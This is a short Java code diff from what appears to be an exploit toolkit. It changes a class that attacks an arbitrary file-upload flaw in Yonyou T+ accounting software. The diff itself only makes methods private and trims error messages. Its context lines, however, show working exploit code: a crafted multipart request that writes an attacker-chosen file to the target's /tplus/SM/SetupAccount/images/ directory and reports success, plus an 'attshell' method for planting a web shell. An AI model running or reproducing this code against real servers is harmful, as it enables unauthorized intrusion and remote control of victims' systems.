@@ -22,7 +22,7 @@ public class yongyou_chajet_upload implements Exploitlnterface {
         return att;
     }
 
-    public Boolean att(String url,String path,TextArea textArea,String filename){
+    private Boolean att(String url,String path,TextArea textArea,String filename){
         this.headers.put("Content-Type","multipart/form-data; boundary=cdc420c58f599a01de22d557d538b9a4");
         String fir_post = "--cdc420c58f599a01de22d557d538b9a4\r\n" +
                 "Content-Disposition: form-data; name=\"File1\"; filename=\"" + filename + "\"\r\n" +
@@ -38,16 +38,16 @@ public class yongyou_chajet_upload implements Exploitlnterface {
                 textArea.appendText("\n 漏洞存在，测试文件写入成功 \n地址为：" + url + "/tplus/SM/SetupAccount/images/" + filename);
                 return true;
             }else {
-                textArea.appendText("\n yongyou_chajet_upload - 漏洞不存在 (出现误报请联系作者)" + url);
+                textArea.appendText("\n yongyou_chajet_upload - 漏洞不存在 (出现误报请联系作者)");
                 return false;
             }
         }else {
-            textArea.appendText("\n yongyou_chajet_upload - 漏洞不存在 (出现误报请联系作者)" + url);
+            textArea.appendText("\n yongyou_chajet_upload - 漏洞不存在 (出现误报请联系作者)");
             return false;
         }
     }
 
-    public Boolean attshell(String url,TextArea textArea){
+    private Boolean attshell(String url,TextArea textArea){
         HashMap<String,String> head = new HashMap<String,String>();
         head.put("Content-Type","multipart/form-data; boundary=cdc420c58f599a01de22d557d538b9a4");
 
